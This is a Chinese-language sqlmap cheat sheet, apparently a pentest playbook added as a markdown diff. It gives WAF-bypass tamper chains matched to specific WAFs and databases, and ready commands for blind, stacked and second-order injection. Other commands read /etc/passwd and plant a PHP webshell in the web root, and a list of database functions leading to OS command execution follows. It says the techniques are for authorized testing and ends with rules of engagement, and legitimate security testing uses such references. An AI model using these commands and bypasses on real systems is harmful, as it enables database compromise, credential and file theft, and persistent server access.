@@ -1,0 +1,110 @@
+# SQLMap 高级工作流与 WAF 绕过 Tamper 矩阵
+
+> sqlmap 高级面：WAF 场景 tamper 链、折叠注入、GraphQL+SQLi、二级注入、DB 专有函数。全部授权测试手法。
+
+## 1. Tamper 脚本矩阵（WAF/IDS 绕过核心）
+
+Tamper 通过逗号叠加（`--tamper=a,b,c`），逐层修改 payload。
+
+| Tamper | 效果 | 针对 |
+|--------|------|------|
+| `space2comment` | `SELECT/**/username` | 拦空格 WAF |
+| `space2plus` | `SELECT+username` | URL 编码空格过滤器 |
+| `space2hash` | `SELECT%23%0ausername` | MySQL `#\n` 当空格 |
+| `space2mssqlblank` | 随机空白字符（`%00`–`%0F`） | MSSQL |
+| `space2morehash` | 更激进 `#\n` padding | 严格 WAF 后 MySQL |
+| `between` | `> ` → `NOT BETWEEN 0 AND` | 拦比较符 WAF |
+| `charencode` | 全字符 URL 编码 | 通用 |
+| `chardoubleencode` | 双重 URL 编码 | 先解码一次的代理 |
+| `randomcase` | `SeLeCt` | 大小写敏感规则 |
+| `randomcomments` | `SEL/**/ECT` | 签名型 WAF |
+| `equaltolike` | `=` → `LIKE` | 拦 `=` WAF |
+| `greatest` | `>` → `GREATEST(val,X)=val` | 拦比较符 |
+| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL(...))` | MySQL 特化 WAF |
+| `modsecurityversioned` | `/*!50000SELECT*/` | ModSecurity CRS + MySQL |
+| `modsecurityzeroversioned` | `/*!00000SELECT*/` | ModSecurity 宽松版本 |
+| `unionalltounion` | `UNION ALL` → `UNION` | 拦 UNION ALL 规则 |
+
+### 场景 tamper 组合
+```
+MySQL + ModSecurity CRS:  modsecurityversioned,space2comment,randomcomments
+MySQL + Cloudflare:        between,randomcase,space2comment,equaltolike
+MSSQL + IIS:               space2mssqlblank,chardoubleencode
+Oracle + enterprise WAF:   charencode,randomcase,concat2concatws
+双代理(先解码一次):        chardoubleencode
+IIS+ASP 百分比过滤:        charencode,space2comment
+PostgreSQL 严格:           between,randomcase,randomcomments
+```
+
+## 2. 命令组合速查
+
+```
+# 探测(WAF检测+识别)
+sqlmap -u URL --waf --identify-waf
+
+# 盲注静默侦察(较少噪音)
+sqlmap -u URL --batch --level=2 --risk=1 --technique=B --string="YOU_REPLY"
+
+# 折叠/堆叠注入(MSSQL xp_cmdshell)
+sqlmap -u URL --batch --risk=3 --technique=Q --sql-shell
+
+# 二级注入(注入存 DB,另一页回显)
+sqlmap -u URL --batch --second-url "http://victim/profile"
+sqlmap -r second.req --second-url "http://victim/profile"
+
+# 读文件/写 webshell(需权限)
+sqlmap -u URL --file-read=/etc/passwd
+sqlmap -u URL --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
+
+# 跳过指纹指定 DBMS
+sqlmap -u URL --dbms=mysql --level=3
+
+# JSON body + 自定义头
+sqlmap -r api.req --headers="Content-Type: application/json" --level=3
+
+# 指定注入标记(URL 中 %INJECT%)
+sqlmap -u "http://t/find?q=%INJECT%" --prefix="'" --suffix="-- -"
+
+# 提速盲注
+sqlmap -u URL --threads=10 --batch --technique=B
+
+# 带 cookie 注入
+sqlmap -u URL --cookie="session=..." --level=2
+```
+
+## 3. INSERT / UPDATE / DELETE 注入
+
+- 需 `--risk=3`（启用 OR 型 payload，UPDATE/DELETE 上下文适用）
+- 用 `--string`/`--not-string` 标记成功/失败响应差分
+- 堆叠查询环境（`--technique=Q`）可测非 SELECT 语句
+- 注入类型识别：报错/布尔/时间在读写型语句的行为不同
+
+## 4. GraphQL + SQL 注入
+
+GraphQL 把 SQLi 藏进参数：
+```
+filter / where 参数 → 引号差分
+orderBy / sortBy → ORDER BY 注入位（预编译无效位）
+limit / offset → 数值注入
+search / full-text → LIKE 面
+```
+标记注入：
+```
+# 内联标记
+graphql query 里 q: "%INJECT%"
+# 请求文件（复杂查询推荐）
+sqlmap -r graphql.req --level=3 --risk=2
+```
+
+## 5. DB 专有高级函数（按库选用）
+- **MSSQL**：`xp_cmdshell`、`OPENROWSET`、`BULK INSERT`
+- **MySQL**：`LOAD_FILE()`、`INTO OUTFILE`（写 webshell）、UDF
+- **PostgreSQL**：`COPY ... FROM PROGRAM`、PL/Python 函数
+- **Oracle**：`UTL_HTTP`、`DBMS_LDAP`
+- **SQLite**：`load_extension`（需控制扩展文件路径）
+
+## 6. 纪律
+- sqlmap 先手工确认注入点（差分证据）再深入；结果人工复核
+- `--file-write` 只写授权 PoC，用完即删（`webshell.md` 协议）
+- WAF 场景用 tamper 链 + 手工调整，不是无限堆 tamper
+- `--os-shell`/meterpreter 只在授权演练环境；SRC 不做交互式 shell
